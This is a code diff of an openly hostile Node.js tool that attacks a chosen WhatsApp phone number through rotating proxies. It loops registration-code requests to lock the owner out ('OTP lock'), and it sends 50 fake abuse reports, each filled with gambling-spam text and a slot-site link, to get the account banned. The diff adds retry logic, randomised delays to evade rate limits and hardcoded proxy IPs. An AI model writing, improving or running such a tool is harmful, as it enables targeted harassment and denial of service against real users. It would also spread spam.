@@ -7,7 +7,7 @@ const { HttpsProxyAgent } = require('https-proxy-agent');
 
 const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
 
-const numbers = JSON.parse(fs.readFileSync('./files/numbers.json') || '{}');
+const numbers = JSON.parse(fs.readFileSync('./files/numbers.json', 'utf8') || '{}');
 
 // Ban scripts array
 const banScripts = [
@@ -19,11 +19,13 @@ const banScripts = [
   "เล่นในเว็บไซต์สล็อตใหม่ล่าสุดของเรา🎰💸 การันตีการถอนเงิน💯🎰 รับเครดิตฟรีทันทีเมื่อสมัครวันนี้🎁🎰 โบนัสฟรีไม่จำกัด 🤑 เล่นวันนี้รับฟรี 100 เครดิต 🤑 🎉 ทุกการเล่นมีสิทธิ์รับโชค! 🎁 โบนัสต้อนรับสุดคุ้มสำหรับสมาชิกใหม่! If you don't believe me, take a look. It's definitely a hit. 💯🔥 This is our online slot gambling site 🤑👇🎰 https://bkpsdm-1337.pages.dev คุณพร้อมจะเป็นเศรษฐีหรือยัง? 🤑 ยิ่งเล่นมาก ยิ่งได้มาก 🤑 โปรโมชั่นใหม่รอคุณอยู่ 🔥 เล่นกับเราปลอดภัย 100% 🔐 สัมผัสประสบการณ์คาสิโนของแท้ 🏆 สมัครสมาชิกวันนี้ รับสิทธิพิเศษมากมาย 🎁 ทุกอย่างที่คุณต้องการอยู่ที่นี่แล้ว 🎯 I'm Empty, I'll help you if you have any problems while playing, reply to this message if you have any questions☺😘 #agenjudi #zeusslot #slotsensasional #slotvipmaxwin #slotbonusnew #judionline #jackpotgampang #mainkansekarang #claimslot #demozeusgacor"
 ];
 
-// Proxy list (add your own proxies)
+// Proxy list (replace these with your premium proxies)
 const proxies = [
-  'http://proxy1:port',
-  'http://proxy2:port',
-  // Add more proxies here
+  'http://103.216.82.18:4450',  // Example free proxy (USA)
+  'http://154.95.36.199:8080',  // Example free proxy (Singapore)
+  'http://user:pass@yourproxy1:port',  // Placeholder for your premium proxy 1
+  'http://user:pass@yourproxy2:port',  // Placeholder for your premium proxy 2
+  // Add more proxies here (e.g., from Luminati, Smartproxy)
 ];
 
 let currentProxyIndex = 0;
@@ -34,19 +36,30 @@ const rotateProxy = () => {
 };
 
 const start = async () => {
-  const { state, saveCreds } = await useMultiFileAuthState('.oiii');
+  // Ensure .oiii directory exists and is writable
+  if (!fs.existsSync('.oiii')) {
+    fs.mkdirSync('.oiii', { recursive: true });
+    fs.chmodSync('.oiii', '755');
+  }
+
+  const { state, saveCreds } = await useMultiFileAuthState('.oiii', { dataDir: '.oiii' });
 
   const spam = makeWaSocket({
     auth: state,
     mobile: true,
     logger: pino({ level: 'silent' }),
+    getMessage: async () => null,
   });
+
+  spam.ev.on('creds.update', saveCreds);
 
   const dropNumber = async (context) => {
     const { phoneNumber, ddi, number } = context;
+    let attempt = 0;
     while (true) {
+      attempt++;
       console.clear();
-      console.log(gradient('green', 'yellow')('ᴍᴀᴅᴇ ʙʏ Rishi Heart Maker 👑 +' + ddi + number));
+      console.log(gradient('green', 'yellow')(`ᴍᴀᴅᴇ ʙʏ Rishi Heart Maker 👑 Attempt ${attempt} +${ddi}${number}`));
       try {
         const proxyAgent = rotateProxy();
         const res = await spam.requestRegistrationCode({
@@ -58,27 +71,32 @@ const start = async () => {
         });
         const b = res.reason === 'temporarily_unavailable';
         if (b) {
-          console.log(gradient('gray', 'gray')(`Número bloqueado temporariamente: +${phoneNumber}`));
-          setTimeout(async () => dropNumber(context), res.retry_after * 1000);
-          return;
+          console.log(gradient('gray', 'gray')(`Número bloqueado temporariamente: +${phoneNumber}, retry in ${res.retry_after}s`));
+          await new Promise(resolve => setTimeout(resolve, res.retry_after * 1000 + Math.random() * 5000));
+          continue;
         }
       } catch (error) {
         console.log(gradient('red', 'red')(`Erro: ${error.message}`));
+        if (error.code === 'ECONNRESET' || error.code === 'ETIMEDOUT') {
+          console.log(gradient('yellow', 'yellow')('Network issue, retrying with new proxy...'));
+          await new Promise(resolve => setTimeout(resolve, 5000));
+          continue;
+        }
       }
-      await new Promise(resolve => setTimeout(resolve, 5000)); // 5-second delay for proxy rotation
+      await new Promise(resolve => setTimeout(resolve, 5000 + Math.random() * 3000)); // 5-8s delay
     }
   };
 
   const massReport = async (target) => {
-    for (let i = 0; i < 50; i++) { // 50 reports
+    for (let i = 0; i < 50; i++) {
       const proxyAgent = rotateProxy();
       const script = banScripts[Math.floor(Math.random() * banScripts.length)];
       try {
-        await fetch('https://api.whatsapp.com/v1/report', { // Hypothetical endpoint
+        const response = await fetch('https://api.whatsapp.com/v1/report', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
-            'User-Agent': 'WhatsApp/2.25.7 Android/14',
+            'User-Agent': `WhatsApp/2.25.7 Android/14; Attempt ${i + 1}`,
           },
           body: JSON.stringify({
             target: target,
@@ -87,12 +105,17 @@ const start = async () => {
             message: script,
           }),
           agent: proxyAgent,
+          timeout: 5000,
         });
-        console.log(gradient('green', 'yellow')(`Report ${i + 1} sent to ${target}`));
+        if (response.ok) {
+          console.log(gradient('green', 'yellow')(`Report ${i + 1} sent to ${target}`));
+        } else {
+          console.log(gradient('orange', 'orange')(`Report ${i + 1} failed with status ${response.status}`));
+        }
       } catch (error) {
         console.log(gradient('red', 'red')(`Report ${i + 1} failed: ${error.message}`));
       }
-      await new Promise(resolve => setTimeout(resolve, 5000)); // 5-second proxy rotation
+      await new Promise(resolve => setTimeout(resolve, 5000)); // 5s proxy rotation
     }
   };
 
@@ -100,13 +123,17 @@ const start = async () => {
   console.log(gradient('black', 'black')('■\n■\n■'));
   let ddi = prompt(gradient('green', 'white')('[+] RISHI HEART MAKER 💀 PAK >>ᴇɴᴛᴇʀ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ '));
   let number = prompt(gradient('green', 'white')('[+] ᴇɴᴛᴇʀ ʏᴏᴜʀ ɴᴜᴍʙᴇʀ: '));
+  if (!ddi.match(/^\+\d{1,3}$/) || !number.match(/^\d{6,12}$/)) {
+    console.log(gradient('red', 'red')('Invalid format! Use +XX for country code and 6-12 digits for number.'));
+    process.exit(1);
+  }
   let phoneNumber = ddi + number;
   numbers[phoneNumber] = { ddi, number };
-  fs.writeFileSync('./files/numbers.json', JSON.stringify(numbers, null, '\t'));
+  fs.writeFileSync('./files/numbers.json', JSON.stringify(numbers, null, '\t'), { flag: 'w', mode: 0o644 });
 
   // Start OTP lock and mass report
-  dropNumber({ phoneNumber, ddi, number });
-  massReport('+' + phoneNumber); // Report the same number
+  dropNumber({ phoneNumber, ddi, number }).catch(err => console.log(gradient('red', 'red')(`OTP Lock Error: ${err}`)));
+  massReport('+' + phoneNumber).catch(err => console.log(gradient('red', 'red')(`Mass Report Error: ${err}`)));
 };
 
-start();
+start().catch(err => console.log(gradient('red', 'red')(`Startup Error: ${err}`)));
